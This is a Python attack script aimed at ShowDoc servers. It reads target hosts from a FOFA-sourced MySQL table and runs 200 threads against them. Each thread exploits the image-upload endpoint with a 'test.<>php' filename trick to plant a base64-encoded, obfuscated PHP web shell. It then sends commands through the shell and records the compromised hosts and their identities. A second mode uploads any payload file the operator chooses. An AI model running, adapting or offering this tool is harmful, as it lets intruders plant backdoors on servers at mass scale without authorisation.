import base64
import http
import logging
import re
import sys
from queue import Queue
from threading import Thread

import pymysql
import requests

logging.captureWarnings(True)

http.client.HTTPConnection._http_vsn_str = 'HTTP/1.1'

TABLENAME = "showdocres"  # 存储扫描结果的表
DATATABLENAME = "fofadata"  # 存储数据来源的表
HOST = "127.0.0.1"
MYSQLPORT = 3306
MYSQLUSER = "root"
MYSQLPASSWORD = "root"
DATABASE = "fofa"  # 数据库
HEADERS = {'Content-Type': 'multipart/form-data; boundary=--------------------------921378126371623762173617',
               'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)',
               }
DATA = """----------------------------921378126371623762173617
Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
Content-Type: text/plain

%s
----------------------------921378126371623762173617--"""
def conn(ip, port, user, pwd, db):
    try:
        db = pymysql.connect(host=ip, port=port, user=user, password=pwd, database=db, connect_timeout=3)
        return [True, db]
    except Exception as e:
        return [False]


def getTarGet():
    global HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE, DATATABLENAME
    db = conn(HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE)
    if db[0]:
        database = db[1]
        cursor = database.cursor(pymysql.cursors.DictCursor)
        cursor.execute("select * from {};".format(DATATABLENAME))
        res = cursor.fetchall()
        cursor.close()
        database.close()
        return res


def init(tablename):
    global HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE
    db = conn(HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE)
    if db[0]:
        database = db[1]
        cursor = database.cursor(pymysql.cursors.DictCursor)
        cursor.execute(
            "create table if not exists " + tablename + "(id int auto_increment,ip varchar(100),port varchar(100),url varchar(100),whoami varchar(100),primary key(id))charset=utf8;")
        database.commit()
        cursor.close()
        database.close()


def insert(tablename, url, ip, port,whoami):
    global HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE
    db = conn(HOST, MYSQLPORT, MYSQLUSER, MYSQLPASSWORD, DATABASE)
    if db[0]:
        database = db[1]
        cursor = database.cursor(pymysql.cursors.DictCursor)
        cursor.execute("select ip,port from {};".format(tablename))
        res = cursor.fetchall()
        b = True
        for i in res:
            if i['ip'] == ip and i['port'] == port:
                b = False
                break
        if b:
            cursor.execute(
                "insert into " + tablename + " (url,ip,port,whoami) VALUES ('{}','{}','{}','{}')".format(url,ip,port,whoami))
            database.commit()
        cursor.close()
        database.close()

def poc(ip, port):
    target = "http://" + ip + ":" + str(port) + "/index.php?s=/home/page/uploadImg"
    data=DATA%(base64.b64decode("PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwpmdW5jdGlvbiBwKCRrKQp7CiAgICAkcyA9IDA7CiAgICBmb3JlYWNoIChzdHJfc3BsaXQoJGspIGFzICRhKSB7CiAgICAgICAgZm9yZWFjaCAoc3RyX3NwbGl0KG9yZCgkYSkgLiAiIikgYXMgJGIpIHsKICAgICAgICAgICAgJHMgKz0gJGI7CiAgICAgICAgfQogICAgfQogICAgd2hpbGUgKDEwID4gJHMgJiYgJHMgPCAxMDApIHsKICAgICAgICBpZiAoMTAgPCAkcykgJHMgPSAkcyAqIDI7IGVsc2UgJHMgPSAkcyAvIDM7CiAgICB9CiAgICByZXR1cm4gJHM7Cn0KCmZ1bmN0aW9uIGEoJGIpCnsKICAgICRyID0gIiI7CiAgICBmb3JlYWNoIChzdHJfc3BsaXQoYmFzZTY0X2RlY29kZSgkYikpIGFzICRzKSB7CiAgICAgICAgJHIgLj0gY2hyKG9yZCgkcykgLSBwKGJhc2U2NF9kZWNvZGUoImFIWnFhWFJsIikpKTsKICAgIH0KICAgIHJldHVybiAkcjsKfQokej1hKHN0cl9yb3QxMyhzdHJyZXYoIkhKNXduelZ5b2xMdVlkNXVZdk12IikpKSgiIixhKHN0cnJldigiPUUyVFA5MFRQOTBUTk4yWVFLM2JPZWxuZjlaV3dwbWs3bEpqZkZYbVcrV2llMmtUWmRsbVZpWmhZcVptT2RvVEg2VW1hUzVpYVNabEpXb21MMlloTEs1ak02RW5MaUptYW1wVEg2a2tIeTVpIikpKTsKJHooKTsKPz4=").decode())
    try:
        r=requests.post(target,headers=HEADERS,data=data,timeout=5, verify=False)
        if r.status_code==200 and len(r.text)>10:
            url=re.sub("http://(.*?)/",'http://%s/'%(ip+":"+str(port)),r.json()['url'])
            r2=requests.post(url,data="""h9UTcxFXbKJlHOZTOtliTaUlOm4i""",verify=False,timeout=5)
            if r2.status_code==200:
                whoami=""
                r3=requests.post(url,data="""=E2TI94kHWpjdikTJuonLWokSuojZaUlOm4i""",verify=False,timeout=5)
                if r3.status_code==200 and len(r3.text)>0:
                    whoami=r3.text
                else:
                    whoami="Unknown"
                insert(TABLENAME,target,ip,port,whoami)
                print(target+"\t"+whoami)
    except Exception as e:
        pass
def exp(ip,port,data):
    target = "http://" + ip + ":" + str(port) + "/index.php?s=/home/page/uploadImg"
    data=DATA%data
    try:
        r=requests.post(target,headers=HEADERS,data=data,timeout=5, verify=False)
        if r.status_code==200 and len(r.text)>10:
            url=re.sub("http://(.*?)/",'http://%s/'%(ip+":"+str(port)),r.json()['url'])
            r2=requests.post(url,verify=False,timeout=5)
            if r2.status_code==200:
                print(url)
    except Exception as e:
        print(e)

class Pocer(Thread):
    def __init__(self, q):
        super().__init__()
        self.q = q

    def run(self):
        while not self.q.empty():
            try:
                t = self.q.get()
                ip = t.split(";;")[0]
                port = int(t.split(";;")[1])
                poc(ip,port)
            except Exception as e:
                pass
if __name__ == '__main__':
    args=sys.argv
    if len(args)==1:
        ts = getTarGet()
        init(TABLENAME)
        q = Queue()
        for t in ts:
            ip=t['ip']
            port=t['port']
            q.put("%s;;%s" % (ip, port))
        threads = []
        for i in range(200):
            threads.append(Pocer(q))
        for t in threads:
            t.start()
        for t in threads:
            t.join()
    else:
        try:
            ip=args[1]
            port=args[2]
            filename=args[3]
            f=open(filename,'r',encoding='utf-8')
            text=f.read()
            exp(ip,port,text)
            f.close()
        except Exception as e:
            print(e)